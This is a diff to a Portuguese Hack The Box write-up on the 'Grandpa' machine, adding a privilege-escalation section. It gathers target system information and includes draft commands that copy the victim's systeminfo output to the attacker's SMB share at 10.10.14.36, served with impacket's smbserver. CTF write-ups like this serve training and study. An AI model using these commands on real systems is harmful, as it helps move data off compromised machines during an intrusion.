@@ -39,3 +39,20 @@ Entao, executamos o exploit apos configurar nossa porta de preferencia para fica
 
 
 ## Privilege Escalation
+
+Precisamo agora obter informacoes basicas do nosso alvo e assim continuar procurando um vetor de ataque para escalar o privilegio
+Grupos, Permissoes, Arquiterura, Versao do sistema, etc.. sao informacoes necessarias para escalar.
+
+![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/3.jpg)
+
+transfiro entao o output do `systeminfo` para meu localhost
+
+![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/4.jpg)
+
+
+## Rascunho
+
+```
+systeminfo >> \\10.10.14.36\tools\systeminfo.txt
+sudo python /opt/impacket/examples/smbserver.py tools .
+```
